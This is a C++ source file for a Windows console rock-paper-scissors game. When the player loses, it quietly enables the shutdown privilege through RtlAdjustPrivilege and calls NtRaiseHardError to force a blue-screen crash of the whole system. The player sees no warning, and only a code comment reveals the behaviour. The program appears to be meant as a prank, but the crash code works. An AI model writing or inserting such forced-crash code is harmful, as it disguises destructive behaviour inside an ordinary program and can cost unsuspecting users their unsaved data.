#include <vector>
#include <unordered_map>
#include <iostream>
#include <random>
#include <string>
#include <algorithm>

#include <thread>
#include <chrono>

#include <Windows.h>
#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege ( ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue );
extern "C" NTSTATUS NTAPI NtRaiseHardError ( LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
											 PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response );

const std::vector<std::pair<std::string, std::string>> outcomes = {std::pair<std::string, std::string>("rock", "scissors"),
															 std::pair<std::string, std::string> ( "paper", "rock" ),
															 std::pair<std::string, std::string> ( "scissors", "paper" ) };

int main ( )
{
	std::random_device rd;
	std::mt19937 random ( rd ( ) );
	std::uniform_int_distribution<> distr ( 0, 2 );

	std::cout << "Please select ROCK (1), PAPER (2) or SCISSORS (3)" << std::endl;

	int selectedID;
	std::cin >> selectedID;

	if ( selectedID > 0 && selectedID <= 3 )
	{
		system ( "cls" );

		auto randomSelection = outcomes [distr ( random )];
		auto selectedSelection = outcomes [selectedID - 1];

		std::cout << "your selection: " << selectedSelection.first << std::endl;;
		std::cout << "opponent: " << randomSelection.first << std::endl;

		if ( selectedSelection.first.compare ( randomSelection.first ) == 0 ) /* tie*/
		{
			std::cout << "tie" << std::endl;
		}
		else if ( selectedSelection.second.compare ( randomSelection.first ) == 0 ) /* win */
		{
			std::cout << "win" << std::endl;
		}
		else /* lose */
		{
			std::cout << "lose" << std::endl;
			
      std::this_thread::sleep_for( std::chrono::seconds( 5 ) );
      
      /* bluescreen if you lose */
			BOOLEAN bl;
			ULONG Response;
			RtlAdjustPrivilege ( 19, TRUE, FALSE, &bl ); // Enable SeShutdownPrivilege
			NtRaiseHardError ( STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response ); // Shutdown
		}
	}
	else
	{
		std::cout << "Incorrect value given" << std::endl;
		exit ( -1 );
	}

	std::this_thread::sleep_for ( std::chrono::seconds ( 10 ) );
}
